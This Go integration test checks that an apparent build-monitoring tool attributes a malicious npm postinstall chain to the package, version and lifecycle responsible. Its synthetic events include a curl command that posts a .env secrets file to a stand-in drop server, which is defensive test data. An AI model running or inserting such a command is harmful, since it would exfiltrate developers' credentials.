package attribution_test

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/buildlens/buildlens/pkg/attribution"
	"github.com/buildlens/buildlens/pkg/correlate"
	"github.com/buildlens/buildlens/pkg/runschema"
)

func TestLiveProcessAttributionIntegration(t *testing.T) {
	tempDir := t.TempDir()
	lockfilePath := filepath.Join(tempDir, "package-lock.json")

	// Realistic npm lockfile (v3)
	lockfileContent := `{
  "name": "enterprise-web-app",
  "version": "2.4.0",
  "lockfileVersion": 3,
  "packages": {
    "node_modules/suspicious-package": {
      "version": "1.2.3",
      "integrity": "sha512-4N85698b2A==/xS6283pA56Mna/==",
      "license": "MIT"
    }
  }
}`
	if err := os.WriteFile(lockfilePath, []byte(lockfileContent), 0o644); err != nil {
		t.Fatalf("failed to write lockfile: %v", err)
	}

	// 1. Attribute directly from live-captured process metadata
	pkgDir := filepath.Join(tempDir, "node_modules", "suspicious-package")
	cmdline := "node postinstall.js"

	attr := attribution.AttributeProcess(pkgDir, cmdline, lockfilePath)

	if attr.Package.Name != "suspicious-package" {
		t.Fatalf("expected package name 'suspicious-package', got %q", attr.Package.Name)
	}
	if attr.Package.Version != "1.2.3" {
		t.Errorf("expected version '1.2.3', got %q", attr.Package.Version)
	}
	if attr.Package.IntegrityHash != "sha512-4N85698b2A==/xS6283pA56Mna/==" {
		t.Errorf("integrity hash mismatch: got %q", attr.Package.IntegrityHash)
	}
	if attr.Lifecycle != "postinstall" {
		t.Errorf("expected lifecycle 'postinstall', got %q", attr.Lifecycle)
	}
	if attr.Confidence != "confirmed" {
		t.Errorf("expected confidence 'confirmed', got %q", attr.Confidence)
	}

	// 2. Test live process chain: parent node -> child sh -> grandchild curl
	events := []runschema.Event{
		{
			Kind:    "exec",
			TS:      1000000000,
			PID:     200,
			PPID:    1,
			Comm:    "node",
			Cmdline: "node postinstall.js",
			Cwd:     pkgDir,
		},
		{
			Kind: "open",
			TS:   1001000000,
			PID:  200,
			Comm: "node",
			Path: filepath.Join(tempDir, ".env"),
		},
		{
			Kind:    "exec",
			TS:      1002000000,
			PID:     201,
			PPID:    200,
			Comm:    "sh",
			Cmdline: "sh -c curl -X POST -d @.env https://api.drop-server.example",
			Cwd:     pkgDir,
		},
		{
			Kind:    "exec",
			TS:      1003000000,
			PID:     202,
			PPID:    201,
			Comm:    "curl",
			Cmdline: "curl -X POST -d @.env https://api.drop-server.example",
			Cwd:     pkgDir,
		},
		{
			Kind: "connect",
			TS:   1043000000,
			PID:  202,
			Comm: "curl",
			Dest: "198.51.100.42:443",
		},
	}

	manifest := correlate.ScoreWithOptions(events, correlate.ScoreOptions{
		LockfilePath: lockfilePath,
	})

	if manifest.Status != "findings" || len(manifest.Findings) != 1 {
		t.Fatalf("expected 1 finding, got status=%s count=%d", manifest.Status, len(manifest.Findings))
	}

	f := manifest.Findings[0]

	// Verify exact package attribution propagated through the entire ancestor tree
	if f.Aggregatable.Package.Name != "suspicious-package" {
		t.Errorf("finding package name: %s", f.Aggregatable.Package.Name)
	}
	if f.Aggregatable.Package.Version != "1.2.3" {
		t.Errorf("finding package version: %s", f.Aggregatable.Package.Version)
	}
	if f.Context.Attribution.Confidence != "confirmed" {
		t.Errorf("finding package confidence: %s", f.Context.Attribution.Confidence)
	}
	if f.Context.Attribution.Lifecycle != "postinstall" {
		t.Errorf("finding package lifecycle: %s", f.Context.Attribution.Lifecycle)
	}
	if f.Aggregatable.ElapsedMS != 42 {
		t.Errorf("elapsed_ms = %d, want 42", f.Aggregatable.ElapsedMS)
	}
	if f.Context.Comm != "curl" || f.Context.PID != 202 {
		t.Errorf("finding context should identify grandchild curl: pid=%d comm=%s", f.Context.PID, f.Context.Comm)
	}
}
